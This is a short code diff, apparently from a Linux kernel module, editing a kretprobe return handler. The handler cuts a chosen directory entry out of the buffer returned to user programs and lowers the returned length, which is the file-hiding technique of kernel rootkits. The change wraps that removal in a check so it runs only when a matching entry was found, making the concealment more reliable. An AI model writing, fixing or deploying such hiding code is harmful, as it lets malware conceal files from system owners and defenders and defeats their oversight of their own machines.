@@ -62,13 +62,15 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
         offset += current_ent->d_reclen;
     }
 
-    // offset     2
-    // nextOffset 3
-    // [0, 1, 2, 3, 4]
-    // -----[        ] dest
-    // --------[     ] source
-    memcpy(args->buffer_ptr + offset,  args->buffer_ptr + offset + hide_entry_size, (retval - offset - hide_entry_size));
-    regs_set_return_value(regs, retval - hide_entry_size);
+    if(hide_entry_offset) {
+        // offset     2
+        // nextOffset 3
+        // [0, 1, 2, 3, 4]
+        // -----[        ] dest
+        // --------[     ] source
+        memcpy(args->buffer_ptr + offset,  args->buffer_ptr + offset + hide_entry_size, (retval - offset - hide_entry_size));
+        regs_set_return_value(regs, retval - hide_entry_size);
+    }
 
     return 0;
 }
